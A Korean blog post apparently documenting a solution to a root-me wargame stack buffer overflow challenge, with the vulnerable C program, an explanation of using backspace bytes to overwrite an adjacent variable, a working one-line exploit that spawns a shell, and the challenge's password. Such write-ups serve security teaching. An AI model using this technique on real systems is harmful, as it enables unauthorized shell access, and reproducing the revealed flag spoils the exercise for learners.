---
layout: post
title: "[root-me][app-system] ELF32 - Stack buffer overflow basic 3"
date: 2016-09-16 16:30:00
category: wargame
tags:  [root-me, bof]
---

root-me 의 세번째 stack buffer overflow 문제.
[Challenges/App - System : ELF32 - Stack buffer overflow basic 3 [Root Me : Hacking and Information Security learning platform]](https://www.root-me.org/en/Challenges/App-System/ELF32-Stack-buffer-overflow-basic-3)

<!--more--> 

## Code

- `shell()` 함수를 실행시켜야 한다.
- `buffer[64]`
- `64` bytes 이상 입력할 수 없다.
- `int check` 값이 `0xbffffabc` 로 설정되면 `shell()` 을 실행시킴.
- `0x08` 입력시 back-space 역할을 한다.

```c
/*
 
gcc -m32 -o ch16 ch16.c
 
*/
 
 
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
 
void shell(void);
 
int main()
{
 
  char buffer[64];
  int check;
  int i = 0;
  int count = 0;
 
  printf("Enter your name: ");
  fflush(stdout);
  while(1)
    {
      if(count >= 64)
        printf("Oh no...Sorry !\n");
      if(check == 0xbffffabc)
        shell();
      else
        {
            read(fileno(stdin),&i,1);
            switch(i)
            {
                case '\n':
                  printf("\a");
                  break;
                case 0x08:
                  count--;
                  printf("\b");
                  break;
                case 0x04:
                  printf("\t");
                  count++;
                  break;
                case 0x90:
                  printf("\a");
                  count++;
                  break;
                default:
                  buffer[count] = i;
                  count++;
                  break;
            }
        }
    }
}

void shell(void)
{
  system("/bin/dash");
}
```

## Solve

```c
  int check;
  char buffer[64];
```

스택에서  위와 같이 잡히므로 입력 `read` 시에 `\x08`로 4byte back-space 시킨 다음에 `int check` 값을 overwrite 시킨다.

## Exploit

```bash
$ (python -c 'print "\x08"*4 + "\xbc\xfa\xff\xbf"';cat) | ./ch16
Enter your name: /bin/dash: 1: : not found

cat .passwd
Sm4shM3ify0uC4n
```

